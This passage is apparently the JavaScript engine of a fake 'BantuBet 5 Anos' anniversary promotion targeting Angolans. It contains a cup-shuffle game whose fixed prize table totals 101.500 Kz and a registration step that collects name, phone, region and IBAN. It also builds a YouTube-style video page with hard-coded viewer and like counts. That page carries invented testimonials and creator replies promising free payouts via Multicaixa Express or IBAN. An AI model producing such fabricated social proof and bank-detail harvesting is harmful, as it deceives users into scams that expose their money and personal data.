// BantuBet 5 Anos - Interactive Sales & Gamification Funnel Engine
// Total exact prize sum across all rounds: 101.500 Kz

// --- PRIZE DISTRIBUTION PER ROUND (Sum = exactly 101.500 Kz) ---
const ROUND_REWARDS = [
  10000, // Round 1: +10.000 Kz (Cumulative: 10.000 Kz)
  11500, // Round 2: +11.500 Kz (Cumulative: 21.500 Kz)
  12000, // Round 3: +12.000 Kz (Cumulative: 33.500 Kz)
  13500, // Round 4: +13.500 Kz (Cumulative: 47.000 Kz)
  12500, // Round 5: +12.500 Kz (Cumulative: 59.500 Kz)
  14000, // Round 6: +14.000 Kz (Cumulative: 73.500 Kz)
  13000, // Round 7: +13.000 Kz (Cumulative: 86.500 Kz)
  15000  // Round 8: +15.000 Kz (Cumulative: 101.500 Kz)
];
const TOTAL_TARGET_PRIZE = 101500; // 101.500 Kz

// --- GLOBAL STATE ---
const state = {
  screen: 'intro', // 'intro' | 'landing' | 'welcome' | 'playing' | 'summary' | 'registration' | 'vsl'
  balance: 0,
  roundsWon: 0,
  totalRounds: ROUND_REWARDS.length, // 8
  userName: 'Amigo',
  userPhone: '',
  userIban: '',
  userRegion: '',
  cidade: '',
  variantIndex: 0,
  utmParams: {},
  // Registration sub-step
  regStep: 'intro', // 'intro' | 'name' | 'region' | 'phone'
  // Real Cup Game Kinematic State
  game: {
    currentRound: 1,
    coinCupId: 0,                   // Which cup object (0, 1, or 2) holds the coin
    cupSlots: [0, 1, 2],             // cupSlots[cupId] = current slot index (0, 1, or 2)
    cupRaised: [false, false, false],// cupRaised[cupId] = boolean
    isShuffling: false,
    selectedCup: null,
    roundCompleted: false,
    phase: 'prep',                   // 'prep' | 'peek' | 'closing' | 'shuffling' | 'choosing' | 'result_win' | 'result_loss'
    message: 'Prepara-te...',
    transitionSpeedMs: 380,
    lastCoinStartSlot: -1
  },
  // VSL Page state (YouTube Layout)
  vsl: {
    viewers: 261,
    showCta: false,
    subscribed: false,
    likedVideo: false,
    videoLikes: 47000,
    descExpanded: false,
    likedComments: new Set()
  }
};

// Angola Provinces List (18 Províncias)
const PROVINCIAS_ANGOLA = [
  "Bengo", "Benguela", "Bié", "Cabinda", "Quando Cubango", "Cuanza Norte",
  "Cuanza Sul", "Cunene", "Huambo", "Huíla", "Luanda", "Lunda Norte",
  "Lunda Sul", "Malanje", "Moxico", "Namibe", "Uíge", "Zaire"
];

// Variants text for landing
const VARIANTS = [
  {
    eyebrow: "de vitórias para os Angolanos",
    description: "Celebre connosco 5 anos de emoção. Participe no jogo dos copos e levante seus ganhos em kwanzas reais direto no seu Express ou IBAN."
  },
  {
    eyebrow: "a pagar Angolanos de verdade",
    description: "Chegou a sua vez. Acerte no jogo dos copos e receba os seus kwanzas direto no Express ou IBAN, sem complicações."
  },
  {
    eyebrow: "e milhares já levantaram",
    description: "O evento que está a dar que falar. Jogue os copos, acumule o seu prémio e levante em kwanzas reais no seu Express ou IBAN."
  }
];

// Creator & comments data
const AVATAR_CREATOR = "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/channels4_profile-Zn79LAkSQViJvsIAGvojP7WSIMwEvo.jpg";
const AVATAR_F1 = "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/F-K9OTqIBgC4sRBkRffa4qDSO5FZfpYW.jpg";

const COMMENTS_DATA = [
  { id: 1, name: "Maria Santos", avatar: AVATAR_F1, text: "Acabei de receber meus 101.500 Kz! Pensei que era mentira mas funcionou mesmo. Obrigada BantuBet!", likes: 4300, time: "há 2 horas", isCreator: false },
  { id: 2, name: "João Pedro", avatar: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/H-fjtmuZLYTqqBW5yzf9YZE11WGbh342.jpg", text: "Funciona pra quem nunca usou a BantuBet antes?", likes: 892, time: "há 5 horas", isCreator: false },
  { id: 3, name: "Fly Skuad TV", avatar: AVATAR_CREATOR, text: "@João Pedro Sim! O evento de 5 anos é para todos, novos e antigos utilizadores. Só precisa criar conta e completar o perfil.", likes: 1205, time: "há 4 horas", isCreator: true },
  { id: 4, name: "Ana Beatriz", avatar: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/F2-7HwqKfPC0qNNmSp4elv7xBjSMpSSvi.jpg", text: "Meu marido não acreditava, mostrei o comprovante e ele ficou chocado kkkk", likes: 2100, time: "há 1 dia", isCreator: false },
  { id: 5, name: "Carlos Eduardo", avatar: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/H2-D4rSTTHSXc8F0F2lwJ0XEbRkE799qk.jpg", text: "Já era cliente da BantuBet, esse evento de aniversário foi a melhor coisa que fizeram!", likes: 1543, time: "há 2 dias", isCreator: false },
  { id: 6, name: "Fernanda Lima", avatar: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/F3-7zOBKrI0b56alqsFUZS78N1wuPJeF2.jpg", text: "Quanto tempo demora pra cair na conta?", likes: 456, time: "há 3 horas", isCreator: false },
  { id: 7, name: "Fly Skuad TV", avatar: AVATAR_CREATOR, text: "@Fernanda Lima Normalmente cai em até 24h úteis pelo Multicaixa Express. Por IBAN pode demorar 2-3 dias.", likes: 789, time: "há 2 horas", isCreator: true },
  { id: 8, name: "Ricardo Mendes", avatar: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/H3-i5nD6dSKxEjwEkY6TD0TQp4sIz3Tpc.jpg", text: "Comecei ontem e já ganhei mais de 100 mil Kz no jogo dos copos. Muito fácil!", likes: 3200, time: "há 6 horas", isCreator: false },
  { id: 9, name: "Patrícia Oliveira", avatar: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/F4-7yiTMqP1TXIUf0NdD8xHPqEAxcNWUZ.jpg", text: "Gente, é real! Recebi hoje de manhã. Deus abençoe a BantuBet", likes: 1876, time: "há 1 dia", isCreator: false },
  { id: 10, name: "Miguel Costa", avatar: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/H4-Bz03Gq9YrsZcEwDbqgeAWh5VeRRhks.jpg", text: "Precisa depositar alguma coisa antes?", likes: 234, time: "há 4 horas", isCreator: false },
  { id: 11, name: "Fly Skuad TV", avatar: AVATAR_CREATOR, text: "@Miguel Costa Não! O evento é 100% grátis. Você só joga as rodadas e levanta os ganhos.", likes: 567, time: "há 3 horas", isCreator: true },
  { id: 12, name: "Juliana Ferreira", avatar: AVATAR_F1, text: "Melhor promoção que já vi em Angola. 5 anos de BantuBet e muitos mais!", likes: 2890, time: "há 2 dias", isCreator: false }
];

// --- WEB AUDIO API SYNTHESIZER ---
let audioCtx = null;
let masterGain = null;

function getAudioContext() {
  if (!audioCtx) {
    const AudioContextClass = window.AudioContext || window.webkitAudioContext;
    if (AudioContextClass) {
      audioCtx = new AudioContextClass();
      masterGain = audioCtx.createGain();
      masterGain.gain.value = 0.55;
      masterGain.connect(audioCtx.destination);
    }
  }
  if (audioCtx && audioCtx.state === 'suspended') {
    audioCtx.resume();
  }
  return { ctx: audioCtx, master: masterGain };
}

function playTone(ctx, master, { freq, start, duration, type = 'sine', peak = 0.18, attack = 0.01, glideTo }) {
  try {
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(master);
    osc.type = type;
    osc.frequency.setValueAtTime(freq, start);
    if (glideTo) {
      osc.frequency.exponentialRampToValueAtTime(glideTo, start + duration);
    }
    gain.gain.setValueAtTime(0.0001, start);
    gain.gain.exponentialRampToValueAtTime(peak, start + attack);
    gain.gain.exponentialRampToValueAtTime(0.0001, start + duration);
    osc.start(start);
    osc.stop(start + duration + 0.02);
  } catch (e) {
    console.warn("Audio error", e);
  }
}

function playSound(type) {
  try {
    const { ctx, master } = getAudioContext();
    if (!ctx || !master) return;
    const now = ctx.currentTime;

    switch (type) {
      case 'countdown':
        playTone(ctx, master, { freq: 660, start: now, duration: 0.14, type: 'sine', peak: 0.12, attack: 0.008 });
        break;
      case 'shuffle':
        playTone(ctx, master, { freq: 360, start: now, duration: 0.08, type: 'triangle', peak: 0.09, attack: 0.005 });
        playTone(ctx, master, { freq: 440, start: now + 0.03, duration: 0.07, type: 'sine', peak: 0.06, attack: 0.005 });
        break;
      case 'reveal': {
        const osc = ctx.createOscillator();
        const filter = ctx.createBiquadFilter();
        const gain = ctx.createGain();
        osc.connect(filter);
        filter.connect(gain);
        gain.connect(master);
        osc.type = 'sine';
        osc.frequency.setValueAtTime(240, now);
        osc.frequency.exponentialRampToValueAtTime(720, now + 0.22);
        filter.type = 'lowpass';
        filter.frequency.setValueAtTime(900, now);
        filter.frequency.exponentialRampToValueAtTime(2400, now + 0.22);
        gain.gain.setValueAtTime(0.0001, now);
        gain.gain.exponentialRampToValueAtTime(0.12, now + 0.04);
        gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.24);
        osc.start(now);
        osc.stop(now + 0.26);
        break;
      }
      case 'coin':
        playTone(ctx, master, { freq: 987.77, start: now, duration: 0.08, type: 'sine', peak: 0.14 });
        playTone(ctx, master, { freq: 1318.51, start: now + 0.07, duration: 0.18, type: 'sine', peak: 0.16 });
        break;
      case 'win':
        [523.25, 659.25, 783.99, 1046.5].forEach((freq, idx) => {
          playTone(ctx, master, { freq: freq, start: now + 0.09 * idx, duration: 0.5, type: 'sine', peak: 0.16, attack: 0.015 });
          playTone(ctx, master, { freq: freq * 2, start: now + 0.09 * idx, duration: 0.35, type: 'sine', peak: 0.04 });
        });
        break;
      case 'lose':
        playTone(ctx, master, { freq: 360, start: now, duration: 0.22, type: 'sine', peak: 0.12, glideTo: 220 });
        break;
    }
  } catch (e) {
    console.warn("Sound error:", e);
  }
}

// --- UTILITIES ---
function formatKz(num) {
  return Number(num).toLocaleString('pt-AO').replace(/,/g, ' ');
}

function formatCompact(num) {
  if (num >= 1000) {
    const val = (num / 1000).toFixed(num >= 10000 ? 0 : 1);
    return val + ' mil';
  }
  return num.toString();
}

// --- CONFETTI EFFECT ---
const CONFETTI_COLORS = ["#f97316", "#22c55e", "#3b82f6", "#f59e0b", "#ef4444", "#fbbf24", "#fb923c", "#4ade80"];

function triggerConfetti() {
  const container = document.getElementById('confetti-container');
  if (!container) return;
  container.innerHTML = '';
  
  for (let i = 0; i < 75; i++) {
    const el = document.createElement('div');
    el.className = 'confetti-piece';
    const shapes = ['square', 'rect', 'circle'];
    const shape = shapes[Math.floor(Math.random() * shapes.length)];
    const color = CONFETTI_COLORS[Math.floor(Math.random() * CONFETTI_COLORS.length)];
    const left = Math.random() * 100;
    const delay = Math.random() * 1.5;
    const duration = 2.5 + Math.random() * 2;
    const width = shape === 'rect' ? (4 + Math.random() * 4) : (6 + Math.random() * 8);
    const height = shape === 'rect' ? (10 + Math.random() * 8) : (6 + Math.random() * 8);
    
    el.style.left = `${left}%`;
    el.style.backgroundColor = color;
    el.style.width = `${width}px`;
    el.style.height = `${height}px`;
    el.style.animationDelay = `${delay}s`;
    el.style.animationDuration = `${duration}s`;
    el.style.borderRadius = shape === 'circle' ? '50%' : '2px';
    
    container.appendChild(el);
  }

  setTimeout(() => {
    container.innerHTML = '';
  }, 5000);
}

// --- SVG GRAPHICS GENERATOR ---
function getBantuBetLogoSVG(size = 'small') {
  const dims = {
    small: { width: 100, height: 40 },
    medium: { width: 160, height: 64 },
    large: { width: 280, height: 112 }
  }[size] || { width: 100, height: 40 };

  return `
    <svg width="${dims.width}" height="${dims.height}" viewBox="0 0 280 112" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="4" y="8" width="22" height="22" fill="#f97316" rx="2"></rect>
      <rect x="4" y="34" width="22" height="22" fill="#f97316" rx="2"></rect>
      <rect x="30" y="34" width="22" height="22" fill="#f97316" rx="2"></rect>
      <rect x="30" y="8" width="22" height="22" fill="none" stroke="#f97316" stroke-width="2" rx="2"></rect>
      <g>
        <path d="M62 18h14c6 0 10 3 10 8 0 3-2 5-4 6 3 1 5 4 5 7 0 6-4 9-11 9H62V18zm8 11h5c2 0 3-1 3-3s-1-3-3-3h-5v6zm0 12h6c2 0 4-1 4-4 0-2-2-3-4-3h-6v7z" fill="white"></path>
        <path d="M64 20h14c6 0 10 3 10 8 0 3-2 5-4 6 3 1 5 4 5 7 0 6-4 9-11 9H64V20z" fill="rgba(255,255,255,0.3)"></path>
        <path d="M94 48l12-30h9l12 30h-9l-2-6h-11l-2 6h-9zm13-12h6l-3-10-3 10z" fill="white"></path>
        <path d="M130 18h8l10 18V18h8v30h-8l-10-18v18h-8V18z" fill="white"></path>
        <path d="M162 18h24v7h-8v23h-8V25h-8v-7z" fill="white"></path>
        <path d="M190 18h8v18c0 4 2 6 6 6s6-2 6-6V18h8v19c0 8-5 13-14 13s-14-5-14-13V18z" fill="white"></path>
      </g>
      <text x="222" y="24" fill="#f97316" font-size="12" font-weight="bold" font-family="Arial, sans-serif">bet.</text>
      <defs>
        <linearGradient id="grad5" x1="0%" y1="0%" x2="0%" y2="100%">
          <stop offset="0%" stop-color="#f97316"></stop>
          <stop offset="50%" stop-color="#ea580c"></stop>
          <stop offset="100%" stop-color="#c2410c"></stop>
        </linearGradient>
        <linearGradient id="gradHat" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stop-color="#f97316"></stop>
          <stop offset="100%" stop-color="#ea580c"></stop>
        </linearGradient>
      </defs>
      <path d="M228 32h30v10h-18v8h14c10 0 16 6 16 16s-6 18-18 18h-24V74h22c4 0 6-3 6-8s-2-8-6-8h-22V32z" fill="url(#grad5)"></path>
      <g transform="translate(248, 2)">
        <path d="M12 45L24 5L36 45H12z" fill="url(#gradHat)"></path>
        <path d="M16 38L22 15" stroke="white" stroke-width="3"></path>
        <path d="M22 38L26 20" stroke="white" stroke-width="3"></path>
        <path d="M28 38L30 25" stroke="white" stroke-width="3"></path>
        <circle cx="24" cy="4" r="4" fill="#f97316"></circle>
        <ellipse cx="24" cy="45" rx="14" ry="4" fill="#ea580c"></ellipse>
      </g>
      <rect x="245" y="20" width="4" height="4" fill="#f97316" transform="rotate(45 247 22)"></rect>
      <rect x="270" y="35" width="3" height="3" fill="#22c55e" transform="rotate(30 271 36)"></rect>
      <rect x="275" y="50" width="4" height="4" fill="#f97316" transform="rotate(15 277 52)"></rect>
      <rect x="240" y="55" width="3" height="3" fill="#ea580c" transform="rotate(60 241 56)"></rect>
      <rect x="265" y="15" width="3" height="3" fill="#c2410c" transform="rotate(20 266 16)"></rect>
      <text x="60" y="68" fill="#f97316" font-size="9" font-weight="bold" font-family="Arial, sans-serif">5 anos</text>
      <text x="92" y="68" fill="white" font-size="9" font-family="Arial, sans-serif">de vitorias para os Angolanos</text>
    </svg>
  `;
}

function getCoinSVG(size = 'medium') {
  const px = { small: 46, medium: 56, large: 82 }[size] || 56;
  return `
    <div class="relative animate-bounce-slow" style="width:${px}px; height:${px}px;">
      <svg viewBox="0 0 100 100" class="w-full h-full drop-shadow-xl">
        <defs>
          <linearGradient id="coinGold" x1="0%" y1="0%" x2="100%" y2="100%">
            <stop offset="0%" stop-color="#fbbf24"></stop>
            <stop offset="25%" stop-color="#f59e0b"></stop>
            <stop offset="50%" stop-color="#fcd34d"></stop>
            <stop offset="75%" stop-color="#f59e0b"></stop>
            <stop offset="100%" stop-color="#d97706"></stop>
          </linearGradient>
          <linearGradient id="coinGoldInner" x1="0%" y1="0%" x2="100%" y2="100%">
            <stop offset="0%" stop-color="#fcd34d"></stop>
            <stop offset="50%" stop-color="#f59e0b"></stop>
            <stop offset="100%" stop-color="#b45309"></stop>
          </linearGradient>
          <linearGradient id="fiveGradient" x1="0%" y1="0%" x2="0%" y2="100%">
            <stop offset="0%" stop-color="#f97316"></stop>
            <stop offset="50%" stop-color="#ea580c"></stop>
            <stop offset="100%" stop-color="#c2410c"></stop>
          </linearGradient>
          <radialGradient id="coinShine" cx="30%" cy="30%" r="50%">
            <stop offset="0%" stop-color="#fff" stop-opacity="0.5"></stop>
            <stop offset="100%" stop-color="#fff" stop-opacity="0"></stop>
          </radialGradient>
        </defs>
        <circle cx="50" cy="50" r="48" fill="url(#coinGold)"></circle>
        <circle cx="50" cy="50" r="42" fill="url(#coinGoldInner)"></circle>
        <circle cx="50" cy="50" r="38" fill="none" stroke="#d97706" stroke-width="1.5"></circle>
        ${Array.from({ length: 16 }).map((_, i) => {
          const angle = (22.5 * i * Math.PI) / 180;
          const cx = 50 + 35 * Math.cos(angle);
          const cy = 50 + 35 * Math.sin(angle);
          return `<circle cx="${cx.toFixed(1)}" cy="${cy.toFixed(1)}" r="1.5" fill="#b45309"></circle>`;
        }).join('')}
        <text x="50" y="52" text-anchor="middle" dominant-baseline="middle" font-size="36" font-weight="bold" font-style="italic" fill="url(#fiveGradient)" stroke="#7c2d12" stroke-width="1">5</text>
        <text x="50" y="72" text-anchor="middle" font-size="10" font-weight="bold" letter-spacing="2" fill="#7c2d12">ANOS</text>
        <text x="50" y="26" text-anchor="middle" font-size="8" font-weight="bold" letter-spacing="1" fill="#7c2d12">BANTUBET</text>
        <circle cx="50" cy="50" r="42" fill="url(#coinShine)"></circle>
        <g transform="translate(60, 25) rotate(15)">
          <polygon points="0,0 -8,18 8,18" fill="white" stroke="#f97316" stroke-width="1"></polygon>
          <line x1="-2" y1="5" x2="-5" y2="14" stroke="#f97316" stroke-width="2"></line>
          <line x1="2" y1="5" x2="5" y2="14" stroke="#f97316" stroke-width="2"></line>
          <circle cx="0" cy="-1" r="3" fill="#f97316"></circle>
        </g>
      </svg>
    </div>
  `;
}

function getCupSVG(cupId) {
  return `
    <div class="w-full h-full relative">
      <svg viewBox="0 0 100 140" class="w-full h-full drop-shadow-xl select-none">
        <defs>
          <linearGradient id="cupBody-${cupId}" x1="0%" y1="0%" x2="100%" y2="0%">
            <stop offset="0%" stop-color="#7c2d12"></stop>
            <stop offset="15%" stop-color="#9a3412"></stop>
            <stop offset="35%" stop-color="#c2410c"></stop>
            <stop offset="50%" stop-color="#ea580c"></stop>
            <stop offset="65%" stop-color="#c2410c"></stop>
            <stop offset="85%" stop-color="#9a3412"></stop>
            <stop offset="100%" stop-color="#7c2d12"></stop>
          </linearGradient>
          <linearGradient id="cupBottom-${cupId}" x1="0%" y1="0%" x2="100%" y2="0%">
            <stop offset="0%" stop-color="#c2410c"></stop>
            <stop offset="30%" stop-color="#ea580c"></stop>
            <stop offset="50%" stop-color="#f97316"></stop>
            <stop offset="70%" stop-color="#ea580c"></stop>
            <stop offset="100%" stop-color="#c2410c"></stop>
          </linearGradient>
          <linearGradient id="rimBand-${cupId}" x1="0%" y1="0%" x2="100%" y2="0%">
            <stop offset="0%" stop-color="#9a3412"></stop>
            <stop offset="50%" stop-color="#b45309"></stop>
            <stop offset="100%" stop-color="#9a3412"></stop>
          </linearGradient>
        </defs>
        <path d="M 28 12 L 72 12 L 82 128 L 18 128 Z" fill="url(#cupBody-${cupId})"></path>
        <rect x="20" y="26" width="60" height="6" fill="url(#rimBand-${cupId})" rx="1"></rect>
        ${Array.from({ length: 10 }).map((_, i) => `<circle cx="${24 + 5.5 * i}" cy="29" r="1.2" fill="#f97316" opacity="0.6"></circle>`).join('')}
        <ellipse cx="50" cy="12" rx="22" ry="8" fill="url(#cupBottom-${cupId})"></ellipse>
        <ellipse cx="50" cy="12" rx="17" ry="5" fill="#7c2d12" opacity="0.7"></ellipse>
        <ellipse cx="50" cy="128" rx="32" ry="10" fill="url(#cupBottom-${cupId})"></ellipse>
      </svg>
    </div>
  `;
}

// --- POPULATE STATIC SVGS ON PAGE LOAD ---
function populateStaticSVGs() {
  document.querySelectorAll('.logo-container-small').forEach(el => el.innerHTML = getBantuBetLogoSVG('small'));
  document.querySelectorAll('.logo-container-medium').forEach(el => el.innerHTML = getBantuBetLogoSVG('medium'));
  document.querySelectorAll('.logo-container-large').forEach(el => el.innerHTML = getBantuBetLogoSVG('large'));

  for (let i = 0; i < 3; i++) {
    document.querySelectorAll(`.modal-preview-cup[data-cup="${i}"]`).forEach(el => {
      el.innerHTML = `
        <svg viewBox="0 0 100 140" class="w-full h-full">
          <defs>
            <linearGradient id="modalCupGrad-${i}" x1="0%" y1="0%" x2="100%" y2="0%">
              <stop offset="0%" stop-color="#9a3412"></stop>
              <stop offset="25%" stop-color="#c2410c"></stop>
              <stop offset="50%" stop-color="#ea580c"></stop>
              <stop offset="75%" stop-color="#c2410c"></stop>
              <stop offset="100%" stop-color="#9a3412"></stop>
            </linearGradient>
            <linearGradient id="modalCupTop-${i}" x1="0%" y1="0%" x2="100%" y2="0%">
              <stop offset="0%" stop-color="#ea580c"></stop>
              <stop offset="50%" stop-color="#fb923c"></stop>
              <stop offset="100%" stop-color="#ea580c"></stop>
            </linearGradient>
          </defs>
          <path d="M 18 15 L 82 15 L 72 125 L 28 125 Z" fill="url(#modalCupGrad-${i})"></path>
          <ellipse cx="50" cy="15" rx="32" ry="10" fill="url(#modalCupTop-${i})"></ellipse>
          <rect x="22" y="105" width="56" height="4" fill="#f97316" opacity="0.5" rx="2"></rect>
        </svg>
      `;
    });

    const cupTarget = document.querySelector(`.cup-svg-target-${i}`);
    if (cupTarget) cupTarget.innerHTML = getCupSVG(i);

    const coinTarget = document.querySelector(`.coin-svg-target-${i}`);
    if (coinTarget) coinTarget.innerHTML = getCoinSVG('small');
  }

  renderComments();
}

// --- COMMENTS RENDERER ---
function renderComments() {
  const list = document.getElementById('vsl-comments-list');
  if (!list) return;

  list.innerHTML = COMMENTS_DATA.map(c => {
    const isLiked = state.vsl.likedComments.has(c.id);
    const likeCount = c.likes + (isLiked ? 1 : 0);

    return `
      <div class="flex gap-3 sm:gap-4">
        <img src="${c.avatar}" alt="${c.name}" class="w-9 h-9 sm:w-10 sm:h-10 rounded-full object-cover flex-shrink-0"/>
        <div class="flex-1 min-w-0">
          <div class="flex flex-wrap items-center gap-x-2 gap-y-0.5 mb-1">
            <span class="font-medium text-xs sm:text-sm">${c.name}</span>
            ${c.isCreator ? '<span class="bg-[#303030] text-xs px-2 py-0.5 rounded text-gray-200">Criador</span>' : ''}
            <span class="text-gray-400 text-xs">${c.time}</span>
          </div>
          <p class="text-sm mb-2 break-words text-gray-200">${c.text}</p>
          <div class="flex items-center gap-4">
            <button onclick="toggleCommentLike(${c.id})" class="flex items-center gap-1 text-sm ${isLiked ? 'text-blue-400' : 'text-gray-400'} hover:text-white cursor-pointer">
              <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
                <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z"/>
              </svg>
              <span>${formatCompact(likeCount)}</span>
            </button>
            <button class="text-gray-400 hover:text-white cursor-pointer">
              <svg class="w-4 h-4 rotate-180" fill="currentColor" viewBox="0 0 24 24">
                <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z"/>
              </svg>
            </button>
            <button class="text-sm text-gray-400 hover:text-white">Responder</button>
          </div>
        </div>
      </div>
    `;
  }).join('');
}

// --- 4. GAME FLOW & KINEMATICS ---
let gameActionTimer = null;

function renderRoundStepDots() {
  const dots = [];
  for (let i = 0; i < state.totalRounds; i++) {
    const isPast = i < state.game.currentRound - 1;
    const isCurrent = i === state.game.currentRound - 1;
    let dotClass = 'bg-[#243352] w-2.5';
    if (isPast) {
      dotClass = 'bg-[#4ade80] w-2.5';
    } else if (isCurrent) {
      const winStatus = (state.game.phase === 'result_win') ? 'bg-[#4ade80]' : 'bg-white';
      dotClass = `${winStatus} w-6`;
    }
    dots.push(`<div class="h-1.5 rounded-full transition-all duration-300 ${dotClass}"></div>`);
  }
  return `<div class="flex gap-1.5 justify-center mt-2.5">${dots.join('')}</div>`;
}

function updateGameDOM() {
  const { currentRound, phase, isShuffling, cupSlots, cupRaised, coinCupId, message } = state.game;
  const isChoosing = (phase === 'choosing' || phase === 'result_loss') && !isShuffling;
  const slotLeftPx = [10, 142, 274];

  const roundTitle = document.getElementById('game-round-title');
  if (roundTitle) roundTitle.innerText = `RODADA ${currentRound} DE ${state.totalRounds}`;

  const headline = document.getElementById('game-headline');
  if (headline) headline.innerText = message;

  const balanceEl = document.getElementById('game-balance');
  if (balanceEl) balanceEl.innerText = `${formatKz(state.balance)} Kz`;

  const banner = document.getElementById('game-status-banner');
  if (banner) {
    if (isChoosing) {
      banner.innerHTML = `
        <div class="w-full py-3.5 bg-primary text-primary-foreground font-bold rounded-2xl flex items-center justify-center gap-2 text-lg shadow-xl animate-bounce-pointer">
          <svg class="w-5 h-5 stroke-[3]" viewBox="0 0 24 24" fill="none" stroke="currentColor">
            <polyline points="6 9 12 15 18 9"></polyline>
          </svg>
          ONDE ESTÁ A MOEDA? CLICA NUM COPO!
        </div>
      `;
    } else if (isShuffling) {
      banner.innerHTML = `
        <div class="h-14 flex items-center justify-center text-xs tracking-wider text-muted-foreground font-semibold uppercase animate-pulse">
          A baralhar posições... Observa bem!
        </div>
      `;
    } else if (phase === 'peek') {
      banner.innerHTML = `
        <div class="h-14 flex items-center justify-center text-xs tracking-wider text-accent font-semibold uppercase animate-pulse">
          A memorizar posição inicial...
        </div>
      `;
    } else {
      banner.innerHTML = `<div class="h-14"></div>`;
    }
  }

  for (let cupId = 0; cupId < 3; cupId++) {
    const wrapper = document.getElementById(`cup-wrapper-${cupId}`);
    const btn = document.getElementById(`cup-btn-${cupId}`);
    const arrow = document.getElementById(`cup-arrow-${cupId}`);
    const coinBox = document.getElementById(`coin-box-${cupId}`);

    if (wrapper) {
      const currentSlot = cupSlots[cupId];
      const targetLeft = slotLeftPx[currentSlot];
      const isRaised = cupRaised[cupId];
      const hasCoin = (cupId === coinCupId);

      wrapper.style.left = `${targetLeft}px`;
      if (isRaised) {
        wrapper.classList.add('cup-raised');
      } else {
        wrapper.classList.remove('cup-raised');
      }

      if (btn) {
        btn.disabled = !isChoosing;
        if (isChoosing) {
          btn.classList.add('clickable');
        } else {
          btn.classList.remove('clickable');
        }
      }

      if (arrow) {
        if (isChoosing && !isRaised) {
          arrow.classList.remove('opacity-0');
          arrow.classList.add('opacity-100');
        } else {
          arrow.classList.remove('opacity-100');
          arrow.classList.add('opacity-0');
        }
      }

      if (coinBox) {
        if (hasCoin && isRaised) {
          coinBox.classList.remove('opacity-0', 'scale-0');
          coinBox.classList.add('opacity-100', 'scale-100');
        } else {
          coinBox.classList.remove('opacity-100', 'scale-100');
          coinBox.classList.add('opacity-0', 'scale-0');
        }
      }
    }
  }

  const dotsContainer = document.getElementById('game-dots-container');
  if (dotsContainer) dotsContainer.innerHTML = renderRoundStepDots();

  const modalContainer = document.getElementById('game-modal-container');
  if (modalContainer) {
    if (phase === 'result_win') {
      const roundPrize = ROUND_REWARDS[currentRound - 1] || 12000;
      modalContainer.innerHTML = `
        <div class="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4 z-50">
          <div class="bg-[#131b2e] rounded-2xl p-6 border-2 border-[#f59e0b]/60 text-center relative overflow-hidden w-full max-w-sm shadow-2xl animate-coin-bounce">
            <div class="flex justify-center mb-3">
              ${getCoinSVG('large')}
            </div>
            <h3 class="text-3xl font-bold text-[#4ade80] mb-1 italic">Acertaste!</h3>
            <p class="text-xs tracking-[0.3em] text-muted-foreground mb-4 uppercase font-semibold">RECOMPENSA DA RODADA</p>
            <div class="flex items-center justify-center gap-2 mb-6">
              ${getCoinSVG('small')}
              <span class="text-4xl font-extrabold text-white tabular-nums tracking-tight">+${formatKz(roundPrize)}</span>
              <span class="text-lg text-muted-foreground">Kz</span>
            </div>
            <button onclick="proceedAfterWin()" class="w-full py-4 bg-gradient-to-r from-[#f97316] to-[#fb923c] text-white font-bold rounded-2xl flex items-center justify-center gap-3 hover:opacity-90 active:scale-[0.99] transition-opacity text-lg shadow-xl cursor-pointer">
              <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"></path>
                <path d="M3 3v5h5"></path>
              </svg>
              ${currentRound >= state.totalRounds ? 'Ver Resumo dos Ganhos' : 'Próxima rodada'}
            </button>
          </div>
        </div>
      `;
    } else {
      modalContainer.innerHTML = '';
    }
  }
}

function startInteractiveCupGame() {
  state.balance = 0;
  state.roundsWon = 0;
  state.game.currentRound = 1;
  navigateScreen('playing');
  initRoundFlow();
}

function initRoundFlow() {
  if (gameActionTimer) clearTimeout(gameActionTimer);

  let startSlot;
  do {
    startSlot = Math.floor(Math.random() * 3);
  } while (startSlot === state.game.lastCoinStartSlot && Math.random() < 0.7);
  state.game.lastCoinStartSlot = startSlot;

  state.game.coinCupId = startSlot;
  state.game.cupSlots = [0, 1, 2];
  state.game.cupRaised = [false, false, false];
  state.game.isShuffling = false;
  state.game.selectedCup = null;
  state.game.roundCompleted = false;
  state.game.phase = 'peek';

  const slotNames = ["da Esquerda", "do Meio", "da Direita"];
  state.game.message = `A moeda está no copo ${slotNames[startSlot]}!`;

  for (let c = 0; c < 3; c++) {
    const wrap = document.getElementById(`cup-wrapper-${c}`);
    if (wrap) {
      wrap.style.transition = 'left 350ms ease, transform 350ms cubic-bezier(0.34, 1.56, 0.64, 1)';
    }
  }

  state.game.cupRaised[state.game.coinCupId] = true;
  updateGameDOM();

  playSound('reveal');
  setTimeout(() => playSound('coin'), 200);

  gameActionTimer = setTimeout(() => {
    state.game.phase = 'closing';
    state.game.cupRaised = [false, false, false];
